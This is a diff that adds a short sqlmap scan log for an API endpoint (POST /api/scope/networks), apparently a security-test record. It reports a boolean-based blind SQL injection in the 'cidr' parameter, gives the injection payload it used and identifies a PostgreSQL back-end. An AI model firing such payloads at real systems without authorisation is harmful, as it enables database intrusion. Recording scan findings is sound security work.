@@ -1,0 +1,17 @@
+### endpoint: POST /api/scope/networks
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.8.11}
+[*] starting @ 00:00:00
+
+[00:00:01] [INFO] testing connection to the target URL
+[00:00:02] [INFO] testing if POST parameter 'cidr' is dynamic
+[00:00:03] [INFO] heuristic (basic) test shows that POST parameter 'cidr' might be injectable
+sqlmap identified the following injection point(s):
+---
+Parameter: cidr (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cidr=10.0.0.0/8 AND 1234=1234
+---
+[00:00:05] [INFO] the back-end DBMS is PostgreSQL
